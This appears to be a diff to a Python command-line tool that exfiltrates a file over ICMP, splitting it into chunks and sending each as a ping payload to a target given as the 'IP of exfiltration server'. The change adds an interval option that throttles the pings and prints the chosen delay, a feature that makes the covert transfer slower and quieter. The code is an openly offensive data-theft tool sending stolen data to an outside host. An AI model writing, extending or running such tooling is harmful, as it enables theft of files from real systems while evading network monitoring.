@@ -18,6 +18,7 @@ def main(args_=None):
     parser = argparse.ArgumentParser()
     parser.add_argument("--path", "-p", type=str, required=True, help="Path to file to be extraced")
     parser.add_argument("--target", "-t", type=str, required=True, help="IP of exfiltration server")
+    parser.add_argument("--interval", "-i", type=float, default=1.0, help="Nr of seconds between pings")
     args = parser.parse_args()
 
     c = Controller()
@@ -37,6 +38,7 @@ def main(args_=None):
         print("")
         print("  Total Number of Bytes: " + str(numberOfBytes))
         print("Number of Ping Requests: " + str(numberOfPingRequests))
+        print(" Interval between Pings: " + str(args.interval) + " seconds")
         print("")
         print("")
         
@@ -48,7 +50,7 @@ def main(args_=None):
         
         print("-> Send chunks")
         for p in packages:
-            ping(address=args.target, count=1, payload=p)
+            ping(address=args.target, count=1, interval=args.interval, payload=p)
 
         print("")
         print("")
